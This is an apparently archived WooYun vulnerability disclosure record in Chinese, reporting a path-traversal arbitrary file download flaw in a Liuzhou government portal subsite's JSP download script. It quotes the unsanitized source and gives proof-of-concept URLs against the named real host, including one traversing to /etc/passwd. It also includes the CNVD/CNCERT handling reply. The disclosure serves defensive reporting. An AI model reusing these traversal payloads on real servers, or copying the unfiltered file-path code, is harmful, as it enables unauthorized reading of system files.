{"id": 58888, "wybug_id": "wooyun-2014-049243", "wybug_title": "门户网站某分站参数过滤不严导致任意文件下载", "wybug_corp": "柳州人民政府", "wybug_author": "冰火九天", "wybug_date": "2014-01-20 15:51", "wybug_open_date": "2014-03-06 15:52", "wybug_type": "任意文件遍历/下载", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取", "文件操作参数未加过滤"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-06：\t细节向公众公开  简要描述： 政府门户网站某分站参数过滤不严导致任意文件下载 详细说明：  \nhttp://so.liuzhou.gov.cn:8080/inforadar/jsp/file/file_download.jsp?fileType=file&fileName=../../file/file_download.jsp\n\n\n我们看看源码\n<%@ page contentType=\"text/html;charset=UTF-8\" pageEncoding=\"GBK\" import=\"com.jspsmart.upload.*\" %><%    // 新建一个smartupload对象    SmartUpload su = new SmartUpload();    // 初始化    su.initialize(pageContext);    // 设定contentDisposition为null以禁止浏览器自动打开文件，保证点击链接后是下载文件。    // 若不设定，则下载的文件扩展名为doc时，浏览器将自动用word打开它;扩展名为pdf时，浏览器将用acrobat打开。    su.setContentDisposition(null);    // 根据文件类型确认文件所处文件夹，默认放在file文件夹中    String fileType = request.getParameter(\"fileType\");    if (fileType == null || fileType.equals(\"\")) {        fileType = (String) request.getSession().getAttribute(\"fileType\");    }    String uploadDir = \"file\";    if (fileType != null && !fileType.equals(\"\")) {        uploadDir = fileType;    }    // 文件系统中文件名    String fileName = request.getParameter(\"fileName\");    //System.out.println(fileName);    if (fileName == null || fileName.equals(\"\")) {        fileName = (String) request.getSession().getAttribute(\"fileName\");    }    // 文件原名，可能是中文    String originFileName = request.getParameter(\"originFileName\");    //System.out.println(originFileName);    if (originFileName == null || originFileName.equals(\"\")) {        originFileName = (String) request.getSession().getAttribute(\"originFileName\");    }    if (originFileName != null) {        // 针对采集过来的带附件的文档，originFileName可能是url名，只保留真实文件名        originFileName = originFileName.replaceFirst(\"^.*[/\\\\\\\\](?=[^/\\\\\\\\]*$)\", \"\");    }    try {        // 下载文件        su.downloadFile(\"/jsp/data/\" + uploadDir + \"/\" + fileName, null, originFileName);    } catch (Exception e) {        // e.printStackTrace();    }%>\n很明显，只过滤了originFileName，没有过滤FileName，导致可以跨目录   漏洞证明：  \nhttp://so.liuzhou.gov.cn:8080/inforadar/jsp/file/file_download.jsp?fileType=file&fileName=../../../../../../../../../../../../../../etc/passwd\n\n\n   修复方案：  过滤FileName   版权声明：转载请注明来源 冰火九天@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-01-25 12:41 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给广西分中心，由其后续联系网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}